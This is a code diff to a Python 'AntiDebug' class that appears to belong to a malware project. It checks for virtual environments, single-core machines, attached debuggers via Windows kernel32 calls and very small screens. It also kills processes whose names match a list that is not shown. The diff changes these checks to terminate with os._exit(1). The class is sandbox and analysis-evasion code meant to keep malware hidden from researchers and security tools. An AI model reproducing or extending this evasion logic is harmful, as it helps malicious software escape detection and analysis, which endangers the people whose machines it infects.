@@ -4,17 +4,18 @@ import sys
 import multiprocessing
 import ctypes
 import time
+import os
 
 
 class AntiDebug:
 
     def detect_vm(self):
         if hasattr(sys, 'real_prefix'):
-            sys.exit()
+            os._exit(1)
 
     def detect_core(self):
         if multiprocessing.cpu_count() == 1:
-            sys.exit()
+            os._exit(1)
 
     def check_for_process(self):
         for proc in process_iter():
@@ -23,7 +24,7 @@ class AntiDebug:
                     if name.lower() in proc.name().lower():
                         try:
                             proc.kill()
-                            sys.exit()
+                            os._exit(1)
                         except:
                             sys.exit()
             except (NoSuchProcess, AccessDenied, ZombieProcess):
@@ -32,14 +33,14 @@ class AntiDebug:
     def check_for_debugger(self):
         if ctypes.windll.kernel32.IsDebuggerPresent() != 0 or ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
                 ctypes.windll.kernel32.GetCurrentProcess(), False) != 0:
-            sys.exit()
+            os._exit(1)
 
     def detect_screen_syze(self):
         x = ctypes.windll.user32.GetSystemMetrics(0)
         y = ctypes.windll.user32.GetSystemMetrics(1)
 
         if x <= 200 or y <= 200:
-            sys.exit()
+            os._exit(1)
 
     def ok(self):
         print("caca")
